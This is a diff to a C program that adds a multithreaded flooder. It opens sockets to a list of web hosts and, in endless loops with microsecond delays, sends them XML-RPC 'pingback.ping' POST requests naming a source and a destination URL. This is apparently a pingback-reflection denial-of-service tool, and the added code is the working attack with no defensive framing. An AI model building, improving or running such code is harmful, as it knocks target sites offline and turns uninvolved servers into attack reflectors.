@@ -16,20 +16,75 @@
 #include <pthread.h>
 
 #ifdef LINUX
+    #include <fcntl.h>
     #include <netdb.h>
     #include <errno.h>
 #elif WIN32
 #endif
 
 
+
+
+static char data_start[]=
+"<methodCall>"
+    "<methodName>pingback.ping</methodName>"
+    "<params>"
+       "<param>"
+         "<value><string>\0";
+
+static char data_middle[] =
+"</string></value>"
+       "</param>"
+       "<param>"
+         "<value><string>\0";
+
+static char data_end[] = 
+"</string></value>"
+       "</param>"
+    "</params>"
+ "</methodCall>\0";
+
 #define SERVPORT 80
-URL_RECORD * g_head = NULL;
+
+struct range{
+	int start;
+	int end;
+};
+
+static URL_RECORD * g_head = NULL;
 
 static int g_count = 0;
 
 static int current_idx = 0; 
 
-static void create_socket(URL_RECORD * pR, struct hostent *host);
+static char * source = NULL;
+
+static int source_len = 0;
+
+static int g_random =  0;
+
+static void create_socket(URL_RECORD * pR);
+
+static void send_data(URL_RECORD * pR);
+
+static void * send_request_thread(struct range * p_range);
+
+
+
+
+void set_source_url(char * ps)
+{
+	if (ps ==NULL || *ps =='\0')
+	{
+		printf("[ERROR] source is empty\n");
+		return;
+	}
+	source_len = strlen(ps)+1;
+	source = (char *) malloc(source_len);
+	memset(source, 0, source_len);
+	memcpy(source, ps, source_len-1);
+	source[source_len-1] ='\0';
+}
 
 int set_url_records(int count)
 {
@@ -78,6 +133,11 @@ void release_url_records()
 				{
 					free(p_record->context);
                     p_record->context = NULL;
+				}
+				if(p_record->host != NULL)
+				{
+					free(p_record->host);
+					p_record->host = NULL;
 				}
 
                 if(p_record->fd>=0)
@@ -168,7 +228,7 @@ void add_record(char * record)
         memcpy(hostname, phstart, len);
         hostname[len] ='\0';
         
-	    g_head[current_idx].host_name = hostname;
+        g_head[current_idx].host_name = hostname;
 
         *pch='/';
         len = strlen(pch);
@@ -176,40 +236,66 @@ void add_record(char * record)
         memset(context, 0, len+1);
         memcpy(context, pch+1, len-1);
         context[len] = '\0';
-	    g_head[current_idx].context = context;
+        g_head[current_idx].context = context;
     }
-
-
+   
+    printf("======= record count:%d, %d    %s\n", g_count, current_idx, g_head[current_idx].host_name);
     current_idx++;
 }
 
 // this function run understand pthread
 static void * examine_host(URL_RECORD * pR)
 {
-    if (pR == NULL || pR->host_name == NULL || *(pR->host_name) =='\0')
+    char * p_host_name = NULL;
+    struct addrinfo hints;
+    struct addrinfo *result = NULL;
+    int ret;
+    memset(&hints, 0, sizeof(struct addrinfo));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_flags = AI_CANONNAME;
+    hints.ai_protocol = 0;  
+
+    if (pR == NULL)
     {
         printf("[ERROR] incorrect record\n");
         return NULL;
     }
     
+    if (pR->host_name == NULL || *(pR->host_name) =='\0')
+    {
+	printf("[ERROR] incorrect host_name  %s  %d\n",pR->host_name, pR);
+	return NULL;
+    }
     if (pR->is_tested == TESTED || pR->is_tested == TESTING)
     {
         return NULL;
     }
     pR->is_tested = TESTING;
-
+    
 #ifdef LINUX
-    struct hostent *host;
-    host =  gethostbyname(pR->host_name);
-//TODO calculate cost
-    if( host == NULL)
+	//TODO calculate cost
+    ret = getaddrinfo(pR->host_name, NULL, &hints, &result);
+    if (ret != 0 || result == NULL)
     {
-        printf(" test result:%d\n", errno);
+        printf("[ERROR] can't get host: %s   err:%d   %s\n",pR->host_name, ret, gai_strerror(ret));
+    	pR->is_tested = TESTED;
+	return NULL;
     }
-    else
+
+    char buf[100];
+    memset(buf, 0, sizeof(buf));
+    ret = getnameinfo(result->ai_addr, result->ai_addrlen, buf, sizeof(buf), NULL, 0, NI_NUMERICHOST);
+    if (ret == 0)
     {
-        //TODO create socket
-        create_socket(pR, host);
+         char * h = (char *) malloc(strlen(buf)+1);
+         memcpy(h, buf, strlen(buf));
+         h[strlen(buf)] ='\0';
+         pR->host = h;
+        create_socket(pR);// host);
+    } else {
+	printf("[ERROR] can't get host:%s\n", pR->host_name);
+        return;
     }
 #endif
     pR->is_tested = TESTED;
@@ -220,26 +306,49 @@ static void * examine_host(URL_RECORD * pR)
 
 void start_test()
 {
+   printf("[INFO] preparing sock, it takes some minutes.\n");
+   URL_RECORD * head = g_head;
    int c = g_count; 
     while(c-->0)
     {
-       int i = 1;
-        for(;i%20 != 0; i++,c--)
-        {
-            pthread_t tid;
-            pthread_create(&tid, NULL, examine_host,(void *) &g_head[c]);
-        } 
+        pthread_t tid;
+        pthread_create(&tid, NULL, examine_host,(void *) head++);
+	if (c % 20 ==0 && c>0)
+	{
 #ifdef LINUX
-        sleep(2);
+        sleep(20);
 #endif
+	}
     }
+    
+    while(1)
+    {
+	int flag = 0;
+   	URL_RECORD * head = g_head;
+   	int c = g_count; 
+    	while(c-->0)
+    	{
+		if(head->is_tested == TESTING || head->is_tested == NOT_START)
+		{
+			flag = 1;
+			break;
+		}
+    	}
+	if(flag)
+	{
+		sleep(3);
+	}
+	else
+	{
+		break;
+	}
+    } 
+   printf("[INFO] finished connect preparing\n");
 }
 
-
-
-static void create_socket(URL_RECORD * pR, struct hostent *host)
+static void create_socket(URL_RECORD * pR)
 {
-    if(pR == NULL || host == NULL)
+    if(pR == NULL || pR->host == NULL || *(pR->host)=='\0')//|| host == NULL)
     {
         printf("[ERROR] incorrect parameter\n");
         return;
@@ -257,21 +366,146 @@ static void create_socket(URL_RECORD * pR, struct hostent *host)
     bzero(&serv_addr, sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(SERVPORT);
+   
+    serv_addr.sin_addr.s_addr = inet_addr(pR->host); 
 
-    serv_addr.sin_addr = *((struct in_addr *)host->h_addr_list[0]);
-//    const char *ip = inet_ntoa(serv_addr.sin_addr);
- //   printf("connect to %s  ", ip);
-
+    
     if (connect(sockfd, (struct sockaddr *)&serv_addr, \
                sizeof(struct sockaddr)) == -1) {
-       printf("can't connect to url:%d\n",errno);
+       printf("can't connect to url:%s,  errno:%d\n",pR->host_name, errno);
+       close(sockfd);
        return;
     }
 
-    printf("saved socd %d  ", sockfd);
+    int current = fcntl(sockfd, F_GETFL);
+    fcntl(sockfd, F_SETFL, O_NONBLOCK | current);
+   
+    printf("[INFO] saved sock %s:%d  \n", pR->host_name, sockfd);
     pR->fd = sockfd;
     pR->is_opened = OPENED;
     pR->is_avl = AVAILABLE;
 
 #endif
+}
+
+
+void start_shoot()
+{
+	int range = 0; 
+	if(g_count < RECORDS_PER_THREAD)
+	{
+		range = 1;
+	}
+        else
+	{
+		range = g_count / RECORDS_PER_THREAD +(g_count % RECORDS_PER_THREAD ==0? 0:1);
+	} 
+
+	int i=0;
+	printf("===== start shoot  %d\n", range);
+	for(; i < range; i++)
+	{
+        	pthread_t tid;
+		struct range * pr =(struct range *)malloc(sizeof(struct range));
+		pr->start = i * RECORDS_PER_THREAD;
+		if( i + 1== range)
+		{
+			pr->end = g_count;
+		}
+		else
+		{
+			pr->end = (i+1) * RECORDS_PER_THREAD;
+		}
+		printf("===== start%d   end %d\n", pr->start, pr->end);
+        	pthread_create(&tid, NULL, send_request_thread, (void *)pr);
+		
+	}
+}
+
+static void * send_request_thread(struct range * p_range)
+{
+	printf("[INFO] start thread\n");
+	if (p_range == NULL)
+	{
+		printf("[ERROR] incorrect parameter\n");
+		return;
+	}
+	int start = p_range->start;
+	int end = p_range->end;
+	if(start<0 || end > g_count)
+	{
+		printf("[ERROR] incorrect range [%d-%d]\n", start, end);
+		return;
+	}
+	while(1)
+	{
+		int i = start;
+		int mod = 0;
+		for(; i< end; i++, mod++)
+		{
+			URL_RECORD * pR = &g_head[i];
+			if(pR !=NULL)
+			{
+				send_data(pR);
+      				usleep(30);
+			}
+			if(mod - 30 == 0)
+			{
+				mod = 0;
+      				usleep(30000);
+			}
+		}
+		
+	}
+	
+}
+
+static void send_data(URL_RECORD * pR)
+{
+    char * header = NULL;
+   char * data =NULL;
+    g_random++;
+    if(pR == NULL)
+    {
+	printf("[ERROR]%s Incorrect parameter\n",__FUNCTION__);
+	return;
+    }
+
+    if(pR->fd <0 || pR->is_opened != OPENED || pR->is_avl != AVAILABLE)
+    {
+	printf("[ERROR]%s socket doesn't open    %d    %d   %d \n",__FUNCTION__, pR->fd, pR->is_opened, pR->is_avl);
+	//TODO open socket
+	return;
+    }
+    if(source == NULL || *source =='\0')
+    {
+	printf("[ERROR] no source url \n");
+	return;
+    }
+
+   int s_len = strlen(data_start) ;
+   int m_len = strlen(data_middle) ;
+   int e_len = strlen(data_end) ;
+   int dst_len = strlen(pR->dst_url) ;
+   int total_len = s_len + source_len + 10 + m_len + dst_len + e_len;
+   
+   
+   data = (char *) malloc(total_len);
+   memset(data, 0, total_len);
+
+   sprintf(data, "%s%s%d%s%s%s",data_start, source, g_random, data_middle, pR->dst_url, data_end); 
+
+   header = (char *) malloc(4000);
+   sprintf(header, "POST %s HTTP/1.1\r\n"
+		   "HOST:%s\r\nUser-Agent: Mozilla/5.0(Linux)\r\n"
+		   "Accept: text/html, application/xhtml+xml\r\n"
+                   "Connection: keep-alive\r\n"
+		   "Content-Length: %d \r\n\r\n%s"
+		    , pR->context,pR->host_name, strlen(data), data);
+
+//   int r = write(pR->fd, header, strlen(header));
+   int r = send(pR->fd, header, strlen(header), MSG_DONTWAIT);
+   printf("[INFO] fd:%d   ret:%d   errno:%d\n", pR->fd, r, errno);
+   free(data);
+   free(header);
 }
